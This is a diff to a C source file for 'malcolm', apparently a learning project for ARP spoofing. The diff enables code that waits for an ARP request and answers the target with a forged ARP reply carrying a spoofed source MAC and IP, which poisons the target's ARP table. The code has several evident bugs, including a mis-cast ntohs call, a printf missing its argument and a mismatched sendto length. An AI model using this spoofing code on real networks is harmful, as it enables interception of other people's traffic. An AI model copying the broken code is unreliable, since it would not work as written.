@@ -1,18 +1,5 @@
 #include "malcolm.h"
 
-/*
-static int	read_loop(t_malcolm *mal)
-{
-	char	sendbuf[BUFSIZE];
-	char	recvbuf[BUFSIZE];
-
-	signal(SIGINT, &catch_sigint);
-	send_pckt(&sendbuf);
-	recv_pckt(&recvbuf);
-	return (0);
-}
-*/
-
 void	recv_arp(t_malcolm *mal)
 {
 	char		buf[BUFSIZE];
@@ -22,9 +9,9 @@ void	recv_arp(t_malcolm *mal)
 	char		*ip;
 
 	ret = recvfrom(mal->sockfd, buf, BUFSIZE, 0, mal->d_addr, &mal->d_addrlen);
-	arp = (t_arp *)(buf + 12);
-	if (ret >= (ssize_t)(12 + sizeof(t_arp)) &&
-		ntohs(arp->etype) == ETH_P_ARP &&
+	arp = (t_arp *)(buf + 14);
+	if (ret >= (ssize_t)(14 + sizeof(t_arp)) &&
+		ntohs((uint16_t)(buf + 12)) == ETH_P_ARP &&
 		ntohs(arp->opcode) == 1)
 	{
 		mac = mac_strconv(arp->sender_mac);
@@ -37,7 +24,6 @@ void	recv_arp(t_malcolm *mal)
 	}
 }
 
-/*
 void	send_arp(t_malcolm *mal)
 {
 	ssize_t		ret;
@@ -45,20 +31,21 @@ void	send_arp(t_malcolm *mal)
 	char		buf[BUFSIZE];
 
 	arp = (t_arp *)buf;
-	//arp->etype = htons(ETH_P_ARP);
+	//arp->etype = htons(ETH_P_RARP);
 	arp->htype = htons(1);
 	arp->ptype = htons(ETH_P_IP);
 	arp->hlen = 6;
 	arp->plen = 4;
-	arp->opcode = htons(ARPOP_REQUEST);
+	arp->opcode = htons(2);
 	set_mac_addr(mal->s_maddr, arp->sender_mac, 6);
 	arp->sender_ip = inet_addr(mal->s_ip);
 	set_mac_addr(mal->d_maddr, arp->target_mac, 6);
 	arp->target_ip = inet_addr(mal->d_ip);
-	ret = sendto(mal->sockfd, buf, sizeof(t_arp), 0, mal->ifa->ifa_dstaddr, sizeof(mal->ifa->ifa_dstaddr));
-	printf("send %zu\n", ret);
+	printf("Now sending an ARP reply to the target address with spoofed source, please wait...\n");
+	ret = sendto(mal->sockfd, buf, sizeof(t_arp), 0, mal->d_addr, &mal->d_addrlen);
+	printf("%zu sent\n");
+	printf("Sent an ARP reply packet, you may now check the arp table on the target.\n");
 }
-*/
 
 int	malcolm(t_malcolm *mal)
 {
@@ -77,17 +64,13 @@ int	malcolm(t_malcolm *mal)
 		if (mal->sockfd <= 0)
 			return (-4);
 		recv_arp(mal);
-		//send_arp(mal);
+		close(mal->sockfd);
+		mal->sockfd = set_socket(AF_INET, SOCK_RAW, ETH_P_RARP);
+		if (mal->sockfd <= 0)
+			return (-4);
+		send_arp(mal);
+		close(mal->sockfd);
 	}
-	/*
-	if (!get_addr_info(mal))
-		return (-2);
-	
-	mal->sockfd = set_socket(mal);
-	if (!mal->sockfd)
-		return (-3);
-	read_loop(mal);
-	*/
 	freeifaddrs(ifap);
 	freeaddrinfo(mal->info);
 	return (1);
